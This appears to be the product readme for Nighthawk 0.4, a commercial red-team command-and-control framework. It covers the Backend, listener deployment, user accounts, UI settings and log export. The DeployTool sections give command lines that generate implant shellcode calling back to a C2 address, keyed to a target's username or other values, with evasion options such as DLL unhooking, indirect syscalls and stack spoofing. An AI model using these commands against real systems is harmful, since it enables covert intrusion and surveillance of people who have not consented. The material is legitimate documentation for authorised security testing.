---
tags:
  - nighthawk
---

# Nighthawk 0.4 - Readme

## Installation
Please follow the steps in the _Nighthawk 0.4 - Installation_ guide provided.

## Backend
The Backend comprises the core server element of Nighthawk; it is responsible for managing all aspects of the platform including the deployment of the built-in C2 providers, coordination with external C2 providers, generation of payloads and Nighthawk shellcode, translation of JSON commands into the serialized wire format the agent processes, orchestrating commands such as keylogger/screen-watch/hidden desktop, providing a SOCKS proxy and remote portforward handler, logging, and other minor tasks.

### Licensing
#### Backend Activation
The Nighthawk Backend is also licensed on a per-run basis (there is no limit to the number of instances allowed). The Backend attempts to auto-activate when run unless this behaviour is disabled. If the Backend cannot auto-activate then the first user to connect to the Backend through the UI will be prompted to optionally activate it using the UI as a proxy.

The Backend respects certain environment variables which can be used to control the activation process. These are:

`MANUAL_ACTIVATION` - if `true` then activation online will not be attempted.

`ACTIVATION_URI` - if specified then this should be set to a URL will be used for Backend activation rather than the default URL.

`OUTBOUND_DISABLE_SSL` - if `true` then SSL certificate validation will be disabled for activation.

`OUTBOUND_PROXY` - if specified then this should be set to a proxy server URL through which activation will be attempted.

`OUTBOUND_PROXY_CREDS` - if specified then contains colon-separated credentials for the proxy.

If manual activation is specified then the OS/user temporary directory is checked for the file `activation-response.txt`. If specified then this will be used to activate the Backend. If this file is not present then the file `activation-request.txt` will be written to the temporary directory and this can be used to activate manually through the Nighthawk Portal.

If the Backend cannot be activated it will still function but it will not be possible to create new payloads or interact with existing implants.

### Help
The console help for the Backend is as follows:
```
 _______  .__       .__     __  .__                   __
 \      \ |__| ____ |  |___/  |_|  |__ _____ __  _  _|  | __
 /   |   \|  |/ ___\|  |  \   __\  |  \\__  \\ \/ \/ /  |/ /
/    |    \  / /_/  >   Y  \  | |   Y  \/ __ \\     /|    <
\____|__  /__\___  /|___|  /__| |___|  (____  /\/\_/ |__|_ \\
        \/  /_____/      \/          \/     \/            \/
                                                  v0.4


Usage:
        create <campaign-name> <credentials> [--host=] [--port=] [--http-port=] [--cert=] [--cert-pass=] [--debug] [--allow-all-authkeys] [--log-requests]
        resume <campaign-name> [--host=] [--port=] [--cert=] [--http-port=] [--cert-pass=] [--redeploy=] [--debug] [--allow-all-authkeys] [--log-requests]

Functions:
        create          - create a new campaign (warns if already exists)
        resume          - resume existing campaign (redeploys profiles if --redeploy passed)

Options:
        <campaign-name>        - name of the DB to create for new operation
        <credentials>          - username:password for initial credentials
        [--host=]              - IP to listen on (default: 0.0.0.0)
        [--port=]              - port to listen on (default: 8888)
        [--http-port=]         - cleartext HTTP listener port (for HTTP and HTTPS listeners)
        [--cert=]              - certificate path for HTTPS listener (default: default-cert.pfx)
        [--cert-pass=]         - certificate password (default: none)
        [--redeploy=]          - a comma separated list of listener names to redeploy or * for all (default: none)
        [--debug]              - show stack traces when an error occurs
        [--allow-all-authkeys] - allow for unknown authentication keys to be used by agents
        [--log-requests]       - show all requests on the console
```

The Backend has two key modes `create` and `resume`; the create mode starts a new campaign with the name specified, and resume continues an existing campaign.

It is possible to specify various optional parameters to the Backend including the host and port to bind the server on (default is all interfaces/port 8888); an optional HTTP port in case this is required instead of/in addition to an HTTPS listener; a certificate and password for SSL use if the default self-signed certificate is not sufficient; and a debug flag to log any exceptions which occur to file.

The `create` mode accepts credentials to create the initial campaign user with, and `resume` uses the credentials stored in the campaign database.

The `resume` mode also takes a parameter to specify which profiles (by name, or `*` for all) should be redeployed; by default no profiles are redeployed when a campaign is resumed.

### Profile Deployment
Profiles are deployed using the DeployTool detailed in a later section. The JSON profiles which are deployed using the DeployTool `--deploy` switch launch a new C2 listener (currently only supporting HTTP-based C2) which is developed in Python.

Profiles deployed using the `--adopt` switch are added to the database but do not launch a new C2 listener (these can be either HTTP-based C2 or custom C2 profiles).

For the built-in HTTP-based C2 listener the profile may enable a C2 watchdog which will restart the C2 if the process exits or it becomes unresponsive.

An example DeployTool command-line is:
```
mono DeployTool.exe 127.0.0.1 8888 nighthawk:password --no-verify --deploy=/mnt/shared/Profiles/index.json --instance=index
```

Four profiles are provided which specify defaults which have been shown to work well out of the box; these are located within the `Profiles` directory.

## DeployTool
The DeployTool is used to deploy profiles to the Backend, teardown profiles, add users and generate payloads. It is a Windows .NET Framework application which can also be run on Linux using Mono.

### Help
The help for DeployTool is as follows:
```
 _______  .__       .__     __  .__                   __
 \      \ |__| ____ |  |___/  |_|  |__ _____ __  _  _|  | __
 /   |   \|  |/ ___\|  |  \   __\  |  \\__  \\ \/ \/ /  |/ /
/    |    \  / /_/  >   Y  \  | |   Y  \/ __ \\     /|    <
\____|__  /__\___  /|___|  /__| |___|  (____  /\/\_/ |__|_ \\
        \/  /_____/      \/          \/     \/            \/
                                                  v0.4

Nighthawk Operations Server Deployment Tool


Usage:
        DeployTool <host> <port> <username:password> [options]

        options:
                --http
                        Connect to Operations Server using cleartext HTTP instead of HTTPS.
                --no-verify
                        Disables SSL certificate verification.
                --list-instances
                        Displays the names of all currently running instances.
                --instance=<instance-name>
                        Specify the C2 instance name.
                --secret=<secret-value>
                        Specify the C2 instance service-to-service secret.
                --deploy=<profile.json>
                        Deploy a C2 JSON profile with name --instance and secret --secret.
                --adopt=<profile.json>
                        Adopt a custom C2 with specified JSON profile with name --instance and secret --secret.
                --teardown
                        Teardown deployed C2 instance --instance.
                --teardown-all
                        Teardown all deployed C2 instances.
                --payload=<agent-type>,<arch>,<type>,<keying-method>,<key-value>
                        Generate payload for C2 instance --instance and write to --output file.
                                agent-type: egress, p2p
                                arch: x86, x64
                                type: exe, dll, shellcode
                --keying=<method>|<key>[|<param-1>|<param-2>|...]       (pipe-separated params)
                                keying:
                                        embedded
                                                key: 16 hex characters
                                                params: none
                                        dns
                                                key: string
                                                params: <txt|cname>                                     - record type
                                                                <t|f>                                           - if 't' add random prefix to domain
                                                                <domain-to-query>                       - domain to query
                                        http
                                                key: string
                                                params: <url>                                           - URL to read
                                                                <read-offset>                           - the response offset to read from
                                                                [full-UA]                                       - custom User-Agent header (optional, must be LAST as may contain commas)
                                        file
                                                key: hex characters
                                                params: <file-path>                                     - file path on disk or UNC path
                                                                <integer-offset>                        - the offset in file to read from
                                        reg
                                                key: string
                                                params: <hklm|hkcu>                                     - registry hive
                                                                <registry-subkey>                       - subkey to examine
                                                                <key-name>                                      - key name (key type must be REG_SZ)
                                        env
                                                key: string
                                                params: <variable-name>                         - environment variable name to use
                                        sid
                                                key: string
                                                params: <user|domain>
                                        user
                                                key: string
                                                params: <u|c|cu>                                        - u - username, c - computer, cu - computer\user
                                        serial
                                                key: string
                                                params: none
                                example:
                                        "--keying=http|doctype html><html|https://www.google.com/|2|Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0"
                --opsec=<opsec-1[=params]>|<opsec-2[=params]>|...       (pipe-separated params)
                                opsec:
                                        bypass-eafiaf                           - bypass export/import address filtering
                                        indirect-syscalls                       - use indirect syscalls
                                        remove-pi                                       - remove ProcessInstrumentationCallback
                                        proxy-loadlib                           - proxy calls to LoadLibrary through threadpool
                                        proxy-syscalls                          - proxy syscalls through threadpool
                                        mask-api                                        - spoof stack for syscalls
                                        unhook-dlls=1.dll;2.dll;...     - unhook DLLs (semicolon separated list of dlls)
                                note:
                                        {mask-api} and {indirect-syscalls, remove-pi, proxy-syscalls} are mutually exclusive
                                example:
                                        --opsec=bypass-eafiaf --opsec=mask-api --opsec=unhook-dlls=ntdll.dll,kernel32.dll,winhttp.dll
                --payload-uri=<uri-list> (optional, to override default)
                                uri-list: semicolon separated list of URI to use for C2 or P2P connections
                --proxy-uri=<uri>  (optional, to override default)
                                uri: URI to use for HTTP(S) agent proxy
                --authkey=<guid>
                        Guid key the agent will use for authentication with the Backend.
                --agents-allowed=<number>
                        Number of agents allowed using the associated authkey.
                --c2-profile
                        Retrieve C2 profile for C2 instance --instance and write to --output file.
                --output=<filename>
                        File to use for output.
                --add-user=username:password
                        Adds a new user account to the Operations Server.
```

The DeployTool requires the host and port of the Backend to be supplied along with credentials for authentication. The specific action is then given by the provided switch such as `--deploy` or `--add-user`. The `--no-verify` switch disables SSL certificates validation (which is required by default since the Backend launches with a self-signed certificate).

The most common actions are:

#### Listing Instances
To list currently deployed instances:
```
mono DeployTool.exe 127.0.0.1 8888 nighthawk:password --no-verify --list-instances
```

This will show which profiles are currently deployed (by instance name).

#### Deploy Profile
To deploy a profile:
```
mono DeployTool.exe 127.0.0.1 8888 nighthawk:password --no-verify --deploy=/mnt/shared/Profiles/index.json --instance=index
```

The profile JSON file is supplied in the `--deploy` switch and the `--instance` switch specifies a name that is associated with the profile (this is what is shown within the UI when an associated payload checks in).

#### Teardown Profile
To teardown a deployed profile:
```
mono DeployTool.exe 127.0.0.1 8888 nighthawk:password --no-verify --teardown --instance=index
```

This removes a profile from the and terminates any associated C2 listener. The profile remains in the Backend DB for redeployment on campaign resume if necessary.

Deploying a profile with the same `--instance` again supersedes the existing profile, so a cycle of `--deploy` and `--teardown` activities can safely be performed for the same profile instances while fine-tuning the profile configuration.

Using `--teardown-all` will terminate ALL existing C2 listeners (no `--instance` parameter is required).

#### Add User
To add a user:
```
mono DeployTool.exe 127.0.0.1 8888 nighthawk:password --no-verify --add-user=peter:password123
```

This user can be used for future DeployTool operations and to log in through the UI. Since all commands run against Nighthawk agents are tracked by the issuing user (which is displayed within the console, command queue, and logs) having multiple users allows for better project accountability.

#### Payload Generation
To create an example payload through the command-line:
```
mono DeployTool.exe 127.0.0.1 8888 nighthawk:password --no-verify --instance=index --payload=egress,x64,shellcode "--keying=embedded|41414141414141414141414141414141" --payload-uri=https://192.168.245.128 --output=index-x64-sc.bin
```

This generates a Nighthawk x64 egress payload compressed and encrypted with AES key `0x41414141414141414141414141414141` which will have a the profile `c2-uri` set to `https://192.168.245.128`, and the shellcode is written to `index-x64-sc.bin`. The profile used for the shellcode generated will be taken from the `--instance` parameter (`index` in this case). The key value always comes as the first pipe-separated parameter after the keying method is specified.

To create an example payload keyed to the username `Peter` through the command-line:
```
mono DeployTool.exe 127.0.0.1 8888 nighthawk:password --no-verify --instance=index --payload=egress,x64,shellcode "--keying=user|Peter|u" --payload-uri=https://192.168.245.128 --output=index-x64-sc.bin
```

This generates the same egress payload as the previous command except that the required key is the username `Peter`.

To add additional opsec capabilities to the payload loader pass the `--opsec` flag:

`--opsec=bypass-eafiaf --opsec=unhook-dlls=kernel32.dll;ntdll.dll;winhttp.dll`

This - for example - adds export/import address filtering bypass, and unhooking for the listed DLLs.

#### Retrieving C2 Profile
To retrieve the C2 profile for a deployed instance:
```
mono DeployTool.exe 127.0.0.1 8888 nighthawk:password --no-verify --instance=index --c2-profile --output=index.json
```

This retrieves the profile for instance `index` and writes it to file.

## User Interface
The Nighthawk UI is located within the `ThinUI\bin\Release` folder. It provides the main way that agents are created and interacted with.

### Licensing
#### Activation
The UI is licensed on a per-machine basis with each activation deducting one seat from the total number of seats purchased per company. On first run the UI should display an activation dialog which provides the option to either activate online or a link to copy the activation request for manual activation.

Activation online uses the Nighthawk Portal to activate directly (using URLs specified within Nighthawk.xml path `config/general-settings/licensing`) and manual activation can be performed via the appropriate page on the Nighthawk Portal or via email support.

Successful activation results in the creation (or manual download) of a file `license.bin` within the UI base directory.

#### Deactivation
To deactivate a license and reclaim the seat associated with it for activation elsewhere, the UI menu `Help/Licensing/Deactivate` will remove the license associated with the machine.

### Configuration
The UI has a number of configurable features which are controlled by the `Nighthawk.xml` configuration file. A number of the more important options are detailed:

config/main-ui/agent-view/suppressed - contains a list of agents which have been marked as hidden within the UI;

config/main-ui/agent-view/lastseen-format - this can be `"delta"` to show the agent check-in times in `h/m/s` delta format, or anything else to show the operator relative last seen timestamp as a date and time.

config/process-ui/skip-processes - this list contains the default processes to be skipped when opening a handle to running processes within the process UI or `ps` command;

config/screenwatch-ui/options - this controls the saving of screenwatch images to file, `auto-save` enables the feature and `save-duration` specifies in seconds how long the images should be kept for before being overwritten (as a rotating file set);

config/console-ui/layout - this contains settings related to the console font, colours, sizes - these can be adjusted for accessibility purposes (pinch zooming also works on the console);

config/general-settings/console - `autoscroll` determines whether the control scrolls whenever new command output is received; `max-per-request` relates to console sync when opening a console which already has data associated and instructs the server to send this many console updates per request; `max-to-sync` is the limit for number of commands to synchronise; `max-lines-to-sync` specifies how many lines of output the sync should be truncated at (once this is reached the sync stops regardless of the `max-to-sync` value);

config/general-settings/http-client - contains connect/request/response `timeout` in seconds; `auto-reconnect` attempts to reconnect to the Backend if the client is disconnected (for example dropped VPN); `reconnect-timeout` specifies how many second to try to reconnect for before stopping; `no-ssl-verify` disables SSL certificate validation from the UI against the Backend;

config/general-settings/aliases - contains defined command aliases - these are recognised within the UI as valid command shortcuts (run `help alias` within an agent console for more information);

config/general-settings/commands - contains a series of commands to warn when executed - the `matches` regular expression matches then the user is warned in the console; if `allow-override` is enabled then prefixing the command with `!` allows the command to be executed (this also applies to aliased commands);

config/general-settings/log - this specifies whether unhandled exceptions within the UI are logged to file (within the UI base directory).

config/general-settings/licensing - these settings specifying the URLs that licensing will use for both the UI and for UI-mediate Backend activation. If the value `proxy-uri` is present (with optional `proxy-creds` to authenticate) then this will be used to proxy licensing requests.

## Log Exporter
The logs for a Nighthawk campaign database can be exported at any time during the campaign, and can be exported while the Backend is running.

The help for LogExporter follows:
```
 _______  .__       .__     __  .__                   __    
 \      \ |__| ____ |  |___/  |_|  |__ _____ __  _  _|  | __
 /   |   \|  |/ ___\|  |  \   __\  |  \\__  \\ \/ \/ /  |/ /
/    |    \  / /_/  >   Y  \  | |   Y  \/ __ \\     /|    < 
\____|__  /__\___  /|___|  /__| |___|  (____  /\/\_/ |__|_ \\
        \/  /_____/      \/          \/     \/            \/
                                                  v0.3.0


Usage:
	export <campaign-db> <categories> <format> [--exclude=]

Functions:
	export			- exports logs to file

Options:
	<campaign-db>   - path to campaign DB to export
	<categories>	- log categories to export (agents, allconsoles, consoles, transfers, listeners)
	<format>		- output format (txt, json)
	[--exclude]     - regex exclusion to filter (multiple --exclude can be supplied)

Note:
	'json' format is only valid for 'consoles' or 'allconsoles'.
```

The LogExporter allows the export of agents, consoles, file transfers and listeners with associated URIs to file. The consoles can be exported to JSON format for ingestion into the LogBrowser (available on the Nighthawk Github repo) and the other categories are exported to formatted text files.

If `allconsoles` are exported then all agent consoles and commands are merged into one single file, otherwise agents are separated into different files.

Multiple categories can be provided as a comma-separated list.

If the `--exclude` switch is used then the value of the regex which follows is used to filter results; this can be used to exclude test beacons, specific listener profiles, and similar.
